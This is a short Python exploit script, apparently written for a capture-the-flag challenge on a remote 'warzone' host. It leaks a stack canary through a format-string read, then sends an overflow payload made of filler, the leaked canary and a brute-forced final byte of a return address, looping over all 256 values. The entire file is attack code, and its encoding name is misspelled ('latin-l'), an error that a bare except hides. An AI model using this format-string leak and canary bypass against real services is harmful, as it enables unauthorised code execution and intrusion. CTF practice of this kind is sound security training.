#!/usr/bin/python3
from rootkit import *
from time import sleep
exe=ELF("/bin/cat")
host="warzone.hackrocks.com"
port=7772
gdbscript=""
ofst=316
for i in range(0x100):
	try:
		io = remote("warzone.hackrocks.com","7772")
		re()
		sl(f"%{49}$p")
		rl()
		a=rl()
		# print(a)
		canary=GetInt(a)[0]
		print(hex(canary))
		re()
		sl(p64(0xdeadbeef)*39 + p64(canary) + p64(0xdeadbeef) + chr(i).encode('latin-l'))
		print(re(), i)
		pause()
		sl(b"A")
		info("lmao this op")
		pause()
		io.close()
	except:
		io.close()